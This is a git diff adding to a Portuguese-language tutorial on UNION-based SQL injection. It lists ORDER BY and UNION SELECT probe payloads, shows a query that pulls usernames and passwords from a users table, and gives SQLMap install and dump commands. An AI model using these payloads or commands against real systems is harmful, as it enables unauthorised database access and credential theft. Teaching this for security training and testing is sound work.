@@ -118,7 +118,7 @@ Existem duas maneiras de completar o primeiro passo
 
 A primeira é injetando consultas ORDER BY até que um erro ocorra:
 
-```
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
@@ -126,3 +126,57 @@ A primeira é injetando consultas ORDER BY até que um erro ocorra:
 E assim por diante, até receber um erro (o último valor antes do erro é o número de colunas)
 
 A segunda envolve enviar payloads UNION SELECT com valores NULL
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--  
+' UNION SELECT NULL,NULL,NULL--
+```
+
+assim por diante, até o erro
+
+#### 2. Encontrar colunas com tipos de dados úteis com UNION
+
+Geralmente, dados que você precisa vão estar em formato de string. Tendo o número de colunas, você pode testar cada coluna para verificar se ela contém dados do formato string substituindo o payload UNION SELECT com um valor String:
+
+```sql
+' UNION SELECT "a",NULL,NULL--
+' UNION SELECT NULL,"a",NULL--
+' UNION SELECT NULL,NULL,"a"--
+```
+
+Sem erro = o formato da coluna é string
+
+#### 3. Usando um ataque com UNION para recuperar dados
+
+Tendo o número de colunas e quais colunas contém dados úteis, você pode capturar os dados
+
+Supondo que temos 2 colunas úteis e uma tabela chamada users com as colunas username e password
+
+`UNION SELECT username, password FROM users --`
+
+## SQLMap
+
+SQLMap é uma ferramenta de código aberto para automatizar e explorar falhas de SQLi e tomada de controle em servidores de banco de dados. ela pode ser instalada usando o git:
+
+`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
+
+Algumas das principais opções do SQLMap são:
+
+```
+--url	Fornece a URL para o ataque
+--dbms	Informa ao SQLMap o tipo de banco de dados que está em execução
+--dump	Copia os dados dentro do banco de dados que a aplicação usa
+--dump-all	Copia TODO o banco de dados
+--batch	O SQLMap será executado automaticamente e não solicitará entrada do usuário
+```
+
+Exemplo de ataque SQLMap:
+
+`sqlmap --url <exemplo.com/login.php> --tables --columns`
+
+onde:
+--url - define a url a ser atacada
+--tables - copia as tabelas do banco de dados
+--columns - copia as colunas do banco de dados
+
